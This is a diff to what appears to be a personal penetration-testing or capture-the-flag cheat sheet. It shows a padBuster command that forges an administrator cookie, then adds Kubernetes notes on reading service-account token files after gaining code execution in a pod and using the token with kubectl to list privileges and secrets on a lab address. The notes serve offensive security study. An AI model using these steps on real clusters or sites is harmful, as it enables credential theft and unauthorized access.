@@ -339,3 +339,30 @@ command to decrypt some cookie value:
 if that works, and the cookie value is something you want to manipulate, you can use the same tool to encrypt via the -plaintext argument:
 
 `./padBuster.pl http://10.10.31.123/index.php TaIt46TG994JDsPmpFp8Q0XovkIFJHY4 8 -cookies hcon=TaIt46TG994JDsPmpFp8Q0XovkIFJHY4 -error "Invalid padding" -plaintext user=administratorhc0nwithyhackme`
+
+## Kubernetes
+
+Steps to get kubectl:
+
+```bash
+curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl"
+sudo install -o root -g root -m 0755 kubectl /usr/local/bin/kubectl
+```
+
+If you get RCE in a pod, try to find the secret token from these locations:
+
+```
+/run/secrets/kubernetes.io/serviceaccount
+/var/run/secrets/kubernetes.io/serviceaccount
+/secrets/kubernetes.io/serviceaccount
+```
+
+Once you have it, run kubectl like:
+
+```
+kubectl --token=$(cat token) --server=https://10.10.175.123:6443 --insecure-skip-tls-verify=true [commands]
+```
+
+for commands, finding out what your privs are would be `can-i --list`. Others, like `get secrets -n [namespace]` etc.
+
+Hints from (along with more) this page https://book.hacktricks.xyz/cloud-security/pentesting-kubernetes/kubernetes-enumeration
